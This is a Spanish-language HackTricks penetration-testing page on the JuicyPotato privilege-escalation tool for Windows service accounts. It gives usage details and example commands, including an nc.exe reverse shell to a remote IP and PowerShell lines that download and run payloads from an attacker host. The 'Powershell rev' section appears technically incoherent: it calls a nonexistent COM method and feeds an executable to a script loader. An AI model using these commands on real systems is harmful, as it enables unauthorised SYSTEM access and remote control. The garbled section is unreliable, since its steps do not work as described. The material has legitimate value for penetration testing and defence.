# JuicyPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato no funciona** en Windows Server 2019 y en Windows 10 build 1809 en adelante. Sin embargo, se pueden utilizar [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) para **aprovechar los mismos privilegios y obtener acceso de nivel `NT AUTHORITY\SYSTEM`**. _**Compruébalo en:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (abusando de los privilegios dorados) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Una versión mejorada de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un poco de jugo, es decir, **otra herramienta de escalada de privilegios locales, desde una cuenta de servicio de Windows hasta NT AUTHORITY\SYSTEM**_

#### Puedes descargar juicypotato desde [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Resumen <a href="#summary" id="summary"></a>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) y sus [variantes](https://github.com/decoder-it/lonelypotato) aprovechan la cadena de escalada de privilegios basada en el servicio [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) teniendo el listener de MiTM en `127.0.0.1:6666` y cuando tienes los privilegios `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisión de construcción de Windows encontramos una configuración donde `BITS` estaba desactivado intencionalmente y el puerto `6666` estaba ocupado.

Decidimos armar [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Dale la bienvenida a Juicy Potato**.

> Para la teoría, consulta [Rotten Potato - Escalada de privilegios desde cuentas de servicio hasta SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) y sigue la cadena de enlaces y referencias.

Descubrimos que, aparte de `BITS`, hay varios servidores COM que podemos abusar. Solo necesitan:

1. ser instanciables por el usuario actual, normalmente un "usuario de servicio" que tiene privilegios de suplantación
2. implementar la interfaz `IMarshal`
3. ejecutarse como un usuario elevado (SYSTEM, Administrador, ...)

Después de algunas pruebas, obtuvimos y probamos una extensa lista de [CLSID interesantes](http://ohpe.it/juicy-potato/CLSID/) en varias versiones de Windows.

### Detalles jugosos <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato te permite:

* **Objetivo CLSID** _elige cualquier CLSID que desees._ [_Aquí_](http://ohpe.it/juicy-potato/CLSID/) _puedes encontrar la lista organizada por SO._
* **Puerto de escucha COM** _define el puerto de escucha COM que prefieras (en lugar del 6666 codificado en duro)_
* **Dirección IP de escucha COM** _vincula el servidor a cualquier IP_
* **Modo de creación de proceso** _dependiendo de los privilegios del usuario suplantado, puedes elegir entre:_
  * `CreateProcessWithToken` (necesita `SeImpersonate`)
  * `CreateProcessAsUser` (necesita `SeAssignPrimaryToken`)
  * `ambos`
* **Proceso a lanzar** _lanza un ejecutable o script si la explotación tiene éxito_
* **Argumento del proceso** _personaliza los argumentos del proceso lanzado_
* **Dirección del servidor RPC** _para un enfoque sigiloso, puedes autenticarte en un servidor RPC externo_
* **Puerto del servidor RPC** _útil si quieres autenticarte en un servidor externo y el firewall está bloqueando el puerto `135`..._
* **Modo de PRUEBA** _principalmente para fines de prueba, es decir, para probar CLSID. Crea el DCOM e imprime el usuario del token. Ver_ [_aquí para las pruebas_](http://ohpe.it/juicy-potato/Test/)

### Uso <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Reflexiones finales <a href="#final-thoughts" id="final-thoughts"></a>

Si el usuario tiene los privilegios `SeImpersonate` o `SeAssignPrimaryToken`, entonces eres **SYSTEM**.

Es casi imposible prevenir el abuso de todos estos servidores COM. Podrías pensar en modificar los permisos de estos objetos a través de `DCOMCNFG`, pero buena suerte, esto será un desafío.

La solución real es proteger las cuentas y aplicaciones sensibles que se ejecutan bajo las cuentas `* SERVICE`. Detener `DCOM` ciertamente inhibiría esta explotación, pero podría tener un impacto grave en el sistema operativo subyacente.

De: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Ejemplos

Nota: Visita [esta página](https://ohpe.it/juicy-potato/CLSID/) para obtener una lista de CLSID para probar.

### Obtener una shell inversa de nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev

### Descripción

Este método utiliza el comando `powershell.exe` para ejecutar un script de PowerShell que crea un objeto COM y lo utiliza para lanzar un proceso con privilegios elevados.

### Uso

1. Descargar el script `JuicyPotato.exe` en la máquina objetivo.
2. Ejecutar el siguiente comando de PowerShell en la máquina atacante para crear un payload:

   ```
   $CLSID='{4991D34B-80A1-4291-83B6-3328366B9097}'
   $server='localhost'
   $port=1337
   $t = [type]::GetTypeFromCLSID(('{'+$CLSID+'}'), $server)
   $c = $t.InvokeMember('CreateInstance', 'InvokeMethod', $null, $null, $null)
   $c.Connect(($server + ':' + $port))
   ```

   Este comando creará un objeto COM utilizando el CLSID de `Windows Management Instrumentation` (WMI) y lo conectará al servidor y puerto especificados. Asegúrese de cambiar el valor de `$server` y `$port` según sea necesario.

3. Ejecutar el siguiente comando de PowerShell en la máquina objetivo para lanzar un proceso con privilegios elevados:

   ```
   powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://<attacker_ip>:<attacker_port>/JuicyPotato.exe'); .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a '/c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c $c'"
   ```

   Este comando descargará el archivo `JuicyPotato.exe` del atacante y lo ejecutará con los argumentos especificados. Asegúrese de cambiar `<attacker_ip>` y `<attacker_port>` según sea necesario.

### Notas

- Este método solo funciona en sistemas operativos Windows.
- Este método solo funciona si el usuario actual tiene permisos para crear objetos COM.
- Este método solo funciona si el usuario actual tiene permisos para lanzar el proceso especificado.
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Ejecutar un nuevo CMD (si tienes acceso RDP)

![](<../../.gitbook/assets/image (37).png>)

## Problemas con CLSID

A menudo, el CLSID predeterminado que utiliza JuicyPotato **no funciona** y el exploit falla. Por lo general, se necesitan varios intentos para encontrar un **CLSID que funcione**. Para obtener una lista de CLSID para probar en un sistema operativo específico, debe visitar esta página:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Comprobación de CLSID**

En primer lugar, necesitará algunos ejecutables aparte de juicypotato.exe.

Descargue [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) y cárguelo en su sesión de PS, y descargue y ejecute [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ese script creará una lista de posibles CLSID para probar.

Luego descargue [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(cambie la ruta a la lista de CLSID y al ejecutable de juicypotato) y ejecútelo. Comenzará a probar cada CLSID, y **cuando cambie el número de puerto, significará que el CLSID funcionó**.

**Compruebe** los CLSID que funcionan **usando el parámetro -c**. 

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
